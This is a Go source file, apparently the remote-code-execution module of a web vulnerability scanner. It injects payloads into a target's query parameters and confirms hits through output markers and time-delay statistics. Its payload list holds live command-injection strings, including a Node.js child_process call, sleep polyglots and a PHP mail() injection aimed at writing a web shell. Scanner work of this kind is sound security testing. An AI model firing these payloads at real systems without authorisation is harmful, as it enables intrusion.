package rce

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/areksaxyz/bhyakugan/internal/core"
	"github.com/areksaxyz/bhyakugan/internal/utils"
)

type RCEPayload struct {
	Name    string
	Payload string
	Check   string
	IsTime  bool
}

const (
	rceBaselineSampleCount      = 5
	rceAttackVerificationSample = 2
	rceTimeZScoreThreshold      = 3.0
	rceMinTimeDeltaSeconds      = 2.5
	rceMinTimeDiffEntropy       = 0.08
	rceMinTimeStdDevFloor       = 0.05
	rceMaxDisplayedZScore       = 200.0
)

type timedHTTPResponse struct {
	duration   float64
	statusCode int
	bodyLower  string
	bodyHash   string
	redirects  int
	err        error
}

var RCEPayloads = []RCEPayload{
	{"JS Framework RCE (Node.js)", "process.mainModule.require('child_process').execSync('id').toString()", "uid=", false},
	{"Command Injection Polyglot", "1;sleep${IFS}6;#${IFS}';sleep${IFS}6;#${IFS}\";sleep${IFS}6;#${IFS}", "", true},
	{"PHP mail() RCE", "hacker@example.com -OQueueDirectory=/tmp/ -X/var/www/html/shell.php", "", false},
	{"OS Command Injection (sleep)", "|| sleep 6", "", true},
}

func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound func(core.Finding)) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 5)
	var foundMu sync.Mutex
	isFound := false

	u, _ := url.Parse(baseURL)
	q := u.Query()

	evalParams := []string{"code", "eval", "query", "cmd", "exec", "q"}
	testParams := make(map[string]string)

	if len(q) == 0 {
		if strings.Contains(baseURL, "api") || strings.Contains(baseURL, "eval") {
			for _, ep := range evalParams {
				testParams[ep] = "1"
			}
		}
	} else {
		for param := range q {
			testParams[param] = q.Get(param)
		}
	}
	if len(testParams) == 0 {
		return
	}

	baseBodies := make(map[string]string, len(testParams))
	for targetParam := range testParams {
		baseTarget, err := buildRCEURL(baseURL, testParams, targetParam, "bhyakugan_rce_control")
		if err != nil {
			continue
		}
		req, err := http.NewRequest("GET", baseTarget, nil)
		if err != nil {
			continue
		}
		utils.SetDefaultHeaders(req, baseTarget)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		resp.Body.Close()
		baseBodies[targetParam] = strings.ToLower(string(body))
	}

	isAlreadyFound := func() bool {
		foundMu.Lock()
		defer foundMu.Unlock()
		return isFound
	}
	markFound := func() bool {
		foundMu.Lock()
		defer foundMu.Unlock()
		if isFound {
			return false
		}
		isFound = true
		return true
	}

	for _, p := range RCEPayloads {
		if isAlreadyFound() {
			break
		}
		if strings.Contains(p.Name, "Node.js") && ctx.Language != "node" && ctx.Language != "unknown" {
			continue
		}

		for paramName := range testParams {
			wg.Add(1)
			go func(payload RCEPayload, targetParam string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				if isAlreadyFound() {
					return
				}

				target, err := buildRCEURL(baseURL, testParams, targetParam, payload.Payload)
				if err != nil {
					return
				}

				if payload.IsTime {
					confirmed, detail := confirmTimeBasedSignal(client, baseURL, testParams, targetParam, payload.Payload)
					if confirmed && markFound() {
						onFound(core.Finding{
							Type:       "OS Command Injection (Time-Based)",
							Target:     target,
							Detail:     detail,
							Severity:   "High",
							Confidence: core.ConfidenceProbable,
						})
					}
					return
				}

				req, errReq := http.NewRequest("GET", target, nil)
				if errReq != nil {
					return
				}
				utils.SetDefaultHeaders(req, target)
				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
				bodyLower := strings.ToLower(string(body))
				checkLower := strings.ToLower(payload.Check)

				if payload.Check != "" &&
					strings.Contains(bodyLower, checkLower) &&
					!strings.Contains(baseBodies[targetParam], checkLower) &&
					!strings.Contains(bodyLower, strings.ToLower(payload.Payload)) {
					if markFound() {
						onFound(core.Finding{
							Type:       "Remote Code Execution (RCE)",
							Target:     target,
							Detail:     fmt.Sprintf("Confirmed via %s (direct output marker matched and absent in control response).", payload.Name),
							Severity:   "Critical",
							Confidence: core.ConfidenceConfirmed,
						})
					}
				}
			}(p, paramName)
		}
	}
	wg.Wait()
}

func buildRCEURL(baseURL string, testParams map[string]string, targetParam, payload string) (string, error) {
	fuzzU, err := url.Parse(baseURL)
	if err != nil {
		return "", err
	}
	fuzzQ := fuzzU.Query()
	for k, v := range testParams {
		fuzzQ.Set(k, v)
	}
	fuzzQ.Set(targetParam, payload)
	fuzzU.RawQuery = fuzzQ.Encode()
	return fuzzU.String(), nil
}

func timedRCERequest(client *http.Client, target string) timedHTTPResponse {
	start := time.Now()
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return timedHTTPResponse{err: err}
	}
	utils.SetDefaultHeaders(req, target)
	resp, err := client.Do(req)
	duration := time.Since(start).Seconds()
	if err != nil {
		return timedHTTPResponse{duration: duration, statusCode: 0, err: err}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	return timedHTTPResponse{
		duration:   duration,
		statusCode: resp.StatusCode,
		bodyLower:  strings.ToLower(string(body)),
		bodyHash:   hashBody(body),
		redirects:  countRedirects(resp),
	}
}

func confirmTimeBasedSignal(client *http.Client, baseURL string, testParams map[string]string, targetParam, attackPayload string) (bool, string) {
	controlURL, err := buildRCEURL(baseURL, testParams, targetParam, "bhyakugan_time_control")
	if err != nil {
		return false, ""
	}
	attackURL, err := buildRCEURL(baseURL, testParams, targetParam, attackPayload)
	if err != nil {
		return false, ""
	}

	controls := make([]float64, 0, rceBaselineSampleCount)
	hashFreq := make(map[string]int, rceBaselineSampleCount)
	baselineBodyLower := ""
	for i := 0; i < rceBaselineSampleCount; i++ {
		controlRes := timedRCERequest(client, controlURL)
		if controlRes.err != nil {
			return false, ""
		}
		// HTTP 000 guard.
		if controlRes.statusCode == 0 {
			return false, ""
		}
		if !isUsableHTTPStatus(controlRes.statusCode) {
			return false, ""
		}
		// Redirect guard.
		if controlRes.redirects > 1 {
			return false, ""
		}
		if baselineBodyLower == "" {
			baselineBodyLower = controlRes.bodyLower
		}
		controls = append(controls, controlRes.duration)
		hashFreq[controlRes.bodyHash]++
	}

	baselineMean, baselineStd := computeMeanStdDev(controls)
	baselineHash := dominantHash(hashFreq)

	attacks := make([]float64, 0, rceAttackVerificationSample)
	zScores := make([]float64, 0, rceAttackVerificationSample)
	for i := 0; i < rceAttackVerificationSample; i++ {
		attackRes := timedRCERequest(client, attackURL)
		if attackRes.err != nil {
			return false, ""
		}
		// HTTP 000 guard.
		if attackRes.statusCode == 0 {
			return false, ""
		}
		if !isUsableHTTPStatus(attackRes.statusCode) {
			return false, ""
		}
		// Redirect guard.
		if attackRes.redirects > 1 {
			return false, ""
		}
		// Body hash guard.
		if attackRes.bodyHash == baselineHash {
			return false, ""
		}
		delta := attackRes.duration - baselineMean
		if delta < rceMinTimeDeltaSeconds {
			return false, ""
		}
		entropy := responseDiffEntropy(baselineBodyLower, attackRes.bodyLower)
		if entropy < rceMinTimeDiffEntropy {
			return false, ""
		}

		zRaw := computeZScore(attackRes.duration, baselineMean, baselineStd)
		if zRaw < rceTimeZScoreThreshold {
			return false, ""
		}
		attacks = append(attacks, attackRes.duration)
		zScores = append(zScores, clampZScore(zRaw))
	}

	attackAvg := average(attacks)
	detail := fmt.Sprintf("Probable time-based command-injection signal with z-score control validation (not direct RCE proof). baseline_mean=%.2fs baseline_std=%.3f attack_avg=%.2fs delta=%.2fs z=[%.2f,%.2f]",
		baselineMean, baselineStd, attackAvg, attackAvg-baselineMean, zScores[0], zScores[1])
	return true, detail
}

func isStrongTimeDelaySignal(controls, attacks []float64) bool {
	if len(controls) < 2 || len(attacks) < 2 {
		return false
	}
	controlAvg := average(controls)
	attackAvg := average(attacks)
	if controlAvg >= 4.0 {
		return false
	}
	if attackAvg < 5.5 {
		return false
	}
	if attackAvg-controlAvg < 3.5 {
		return false
	}
	for i := 0; i < 2; i++ {
		if attacks[i]-controls[i] < 3.0 {
			return false
		}
	}
	if spread(controls) > 2.0 || spread(attacks) > 2.5 {
		return false
	}
	return true
}

func average(vals []float64) float64 {
	if len(vals) == 0 {
		return 0
	}
	sum := 0.0
	for _, v := range vals {
		sum += v
	}
	return sum / float64(len(vals))
}

func spread(vals []float64) float64 {
	if len(vals) == 0 {
		return 0
	}
	minV, maxV := vals[0], vals[0]
	for _, v := range vals[1:] {
		minV = math.Min(minV, v)
		maxV = math.Max(maxV, v)
	}
	return maxV - minV
}

func isUsableHTTPStatus(status int) bool {
	return status >= 200 && status <= 499
}

func hashBody(body []byte) string {
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}

func dominantHash(freq map[string]int) string {
	bestHash := ""
	bestCount := -1
	for h, c := range freq {
		if c > bestCount {
			bestHash = h
			bestCount = c
		}
	}
	return bestHash
}

func countRedirects(resp *http.Response) int {
	if resp == nil || resp.Request == nil {
		return 0
	}
	count := 0
	for prev := resp.Request.Response; prev != nil; prev = prev.Request.Response {
		count++
	}
	return count
}

func computeMeanStdDev(samples []float64) (float64, float64) {
	if len(samples) == 0 {
		return 0, 0
	}
	mean := average(samples)
	variance := 0.0
	for _, sample := range samples {
		diff := sample - mean
		variance += diff * diff
	}
	variance /= float64(len(samples))
	return mean, math.Sqrt(variance)
}

func computeZScore(attackTime, meanBaseline, stdDev float64) float64 {
	effectiveStdDev := math.Max(stdDev, rceMinTimeStdDevFloor)
	if effectiveStdDev <= 0 {
		if attackTime > meanBaseline {
			return math.Inf(1)
		}
		if attackTime < meanBaseline {
			return math.Inf(-1)
		}
		return 0
	}
	return (attackTime - meanBaseline) / effectiveStdDev
}

func clampZScore(z float64) float64 {
	if z > rceMaxDisplayedZScore {
		return rceMaxDisplayedZScore
	}
	if z < -rceMaxDisplayedZScore {
		return -rceMaxDisplayedZScore
	}
	return z
}

func responseDiffEntropy(base, attack string) float64 {
	baseTokens := tokenizeForEntropy(base)
	attackTokens := tokenizeForEntropy(attack)
	if len(baseTokens) == 0 && len(attackTokens) == 0 {
		return 0
	}

	union := make(map[string]struct{}, len(baseTokens)+len(attackTokens))
	baseSet := make(map[string]struct{}, len(baseTokens))
	for _, t := range baseTokens {
		baseSet[t] = struct{}{}
		union[t] = struct{}{}
	}
	intersection := 0
	for _, t := range attackTokens {
		if _, ok := baseSet[t]; ok {
			intersection++
		}
		union[t] = struct{}{}
	}
	if len(union) == 0 {
		return 0
	}
	jaccard := float64(intersection) / float64(len(union))
	return 1.0 - jaccard
}

func tokenizeForEntropy(s string) []string {
	normalized := strings.Map(func(r rune) rune {
		if unicode.IsLetter(r) || unicode.IsDigit(r) {
			return unicode.ToLower(r)
		}
		return ' '
	}, s)
	return strings.Fields(normalized)
}
